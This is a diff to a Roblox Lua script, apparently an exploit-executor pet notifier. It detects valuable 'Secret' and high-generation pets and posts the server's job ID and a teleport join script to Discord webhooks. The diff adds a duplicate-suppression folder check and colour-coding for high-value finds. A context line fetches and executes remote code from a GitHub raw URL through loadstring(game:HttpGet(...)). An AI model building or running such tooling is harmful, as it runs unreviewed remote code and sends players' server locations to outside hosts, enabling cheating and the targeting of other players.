@@ -2,6 +2,21 @@
 local folderName = "NHUses"
 local folderExists = game.Workspace:FindFirstChild(folderName) ~= nil
 
+local alreadyHereFolderName = "AlreadyHere"
+local alreadyHereFolder = game.Workspace:FindFirstChild(alreadyHereFolderName)
+local alreadyHereFolderExists = alreadyHereFolder ~= nil
+
+-- Создаем папку AlreadyHere если её нет
+if not alreadyHereFolderExists then
+    local newFolder = Instance.new("Folder")
+    newFolder.Name = alreadyHereFolderName
+    newFolder.Parent = game.Workspace
+    alreadyHereFolder = newFolder
+    alreadyHereFolderExists = false -- Папка только что создана, значит можно отправлять вебхуки
+else
+    alreadyHereFolderExists = true -- Папка уже существует, не отправляем вебхуки
+end
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Brawl575/trekc/refs/heads/main/ant"))()
 
 local HttpService = game:GetService("HttpService")
@@ -387,8 +402,11 @@ local function waitAndDetectPodiums()
     return foundPodiums
 end
 
-local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook)
-    if folderExists then return end -- Не отправлять вебхуки если папка существует
+local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook, hasHighGeneration)
+    -- Не отправлять вебхуки если любая из папок существует
+    if folderExists or alreadyHereFolderExists then 
+        return 
+    end
     
     models = tostring(models or "Unknown models")
     local placeId = game.PlaceId
@@ -423,10 +441,16 @@ local function sendDiscordWebhook(models, webhookUrl, isThirdWebhook)
     else
         local joinScript = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. placeId .. ',"' .. jobId .. '",game.Players.LocalPlayer)'
 
+        -- Определяем цвет на основе генерации (для второго вебхука)
+        local embedColor = 5814783 -- Стандартный цвет
+        if webhookUrl == SPECIAL_WEBHOOK_URL and hasHighGeneration then
+            embedColor = 16711680 -- Красный цвет (RGB: 255, 0, 0) для высокой генерации
+        end
+
         local data = {
             ["embeds"] = {{
                 ["title"] = "Nameless Pet Notifier",
-                ["color"] = 5814783,
+                ["color"] = embedColor,
                 ["fields"] = {
                     {name = "👥 Players:", value = tostring(playerCount) .. "/" .. tostring(maxPlayers), inline = true},
                     {
@@ -510,9 +534,9 @@ local function scheduleFirstWebhook(secretModelsText)
     
     firstWebhookTimer = task.wait(5) -- Ждем 5 секунд
     
-    -- Проверяем, что данные все еще актуальны и папка не создана
-    if pendingFirstWebhookData and not folderExists then
-        sendDiscordWebhook(pendingFirstWebhookData, WEBHOOK_WORKER_URL, false)
+    -- Проверяем, что данные все еще актуальны и папки не созданы
+    if pendingFirstWebhookData and not folderExists and not alreadyHereFolderExists then
+        sendDiscordWebhook(pendingFirstWebhookData, WEBHOOK_WORKER_URL, false, false)
         pendingFirstWebhookData = nil
     end
     
@@ -574,22 +598,33 @@ local function checkPodiums()
             end
         end
         
+        -- Проверяем есть ли петы с генерацией > 5М среди Secret петов для второго вебхука
+        local hasHighGenSecrets = false
+        for _, podium in ipairs(podiums) do
+            local genValue = extractNumber(podium.labels.Generation)
+            local rarity = podium.labels.Rarity
+            if rarity == "Secret" and genValue > 5000000 then
+                hasHighGenSecrets = true
+                break
+            end
+        end
+        
         -- ИСПРАВЛЕНО: Используем планировщик для первого вебхука с задержкой в 5 секунд
-        if #secretModelsFirstWebhook > 0 and not folderExists then
+        if #secretModelsFirstWebhook > 0 and not folderExists and not alreadyHereFolderExists then
             local secretModelsText = table.concat(secretModelsFirstWebhook, ", ")
             spawn(function()
                 scheduleFirstWebhook(secretModelsText)
             end)
         end
         
-        if #secretModelsSecondWebhook > 0 and not folderExists then
+        if #secretModelsSecondWebhook > 0 and not folderExists and not alreadyHereFolderExists then
             local secretModelsText = table.concat(secretModelsSecondWebhook, ", ")
-            sendDiscordWebhook(secretModelsText, SPECIAL_WEBHOOK_URL, false)
+            sendDiscordWebhook(secretModelsText, SPECIAL_WEBHOOK_URL, false, hasHighGenSecrets)
         end
         
-        if #highGenModels > 0 and not folderExists then
+        if #highGenModels > 0 and not folderExists and not alreadyHereFolderExists then
             local highGenModelsText = table.concat(highGenModels, ", ")
-            sendDiscordWebhook(highGenModelsText, ADDITIONAL_WEBHOOK_URL, true)
+            sendDiscordWebhook(highGenModelsText, ADDITIONAL_WEBHOOK_URL, true, false)
         end
         
         wait(5)
